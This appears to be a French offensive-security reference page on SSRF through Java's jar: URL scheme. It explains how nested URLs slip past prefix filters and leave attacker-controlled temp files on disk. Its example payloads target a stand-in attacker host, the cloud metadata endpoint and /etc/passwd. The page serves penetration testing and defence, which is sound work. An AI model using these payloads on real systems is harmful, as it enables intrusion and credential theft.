---
title: "SSRF via le schéma JAR sur les stacks Java"
description: "Le gestionnaire d'URL Java jar: récupère une URL imbriquée pour lire une entrée d'une archive, ce qui force une requête sortante vers un hôte choisi par l'attaquant et écrit l'archive téléchargée dans un fichier temporaire."
keywords:
  - schéma jar
  - gestionnaire d'URL jar
  - SSRF Java
  - URL imbriquée
  - fichier temporaire
---

# JAR

`jar:` est un gestionnaire d'URL Java qui adresse une entrée à l'intérieur d'une archive. Sa forme imbrique une autre URL, l'emplacement de l'archive, avant un séparateur `!/` et le chemin de l'entrée :

```
jar:http://attacker.example/evil.jar!/
jar:http://169.254.169.254/latest/meta-data/!/
jar:file:///etc/passwd!/
```

Pour résoudre l'entrée, le gestionnaire récupère d'abord l'URL imbriquée, de sorte qu'un client Java qui honore `jar:` effectue une requête sortante vers l'hôte que désigne l'URL interne. Cela en fait un vecteur de SSRF à part entière, atteignant les cibles internes `http://` et l'endpoint de métadonnées via l'URL interne même lorsque les contrôles de schéma propres à l'application n'examinaient que le préfixe `jar:` externe.

## L'effet de bord du fichier temporaire

Résoudre une URL `jar:` distante télécharge l'archive imbriquée dans un fichier temporaire sur le disque avant de lire l'entrée demandée. Cette écriture se produit comme effet de bord de la récupération, de sorte qu'une URL `jar:http://...` émet à la fois la requête SSRF et dépose des octets contrôlés par l'attaquant dans un emplacement temporaire, ce qui peut avoir son importance lorsqu'un autre composant traite ensuite les fichiers de ce répertoire.

## Quand y recourir

`jar:` est spécifique aux clients HTTP et à la gestion d'URL de la JVM. Il vaut la peine d'être essayé lorsque la stack est Java et qu'un schéma [HTTP](http-and-https.md) ou [File](file.md) direct est filtré mais pas `jar:`, puisque l'URL imbriquée fait passer les mêmes cibles au-delà d'un contrôle de préfixe. Confirmez le gestionnaire en pointant l'URL interne vers un listener contrôlé par l'attaquant et en guettant la récupération.

## Outils

- **Client URL Java** : un court programme utilisant `new URL("jar:...").openConnection()` exerce directement le gestionnaire, puisque curl ne prend pas en charge le schéma `jar:`.
- **interactsh** : serveur d'interaction hors-bande open-source pour confirmer la récupération imbriquée dans les cas aveugles.
- **Burp Repeater** : soumettez la valeur `jar:` via l'application vulnérable et observez la récupération imbriquée.

## Références

- [PayloadsAllTheThings: Server Side Request Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [Oracle: JAR URL syntax](https://docs.oracle.com/javase/8/docs/api/java/net/JarURLConnection.html)
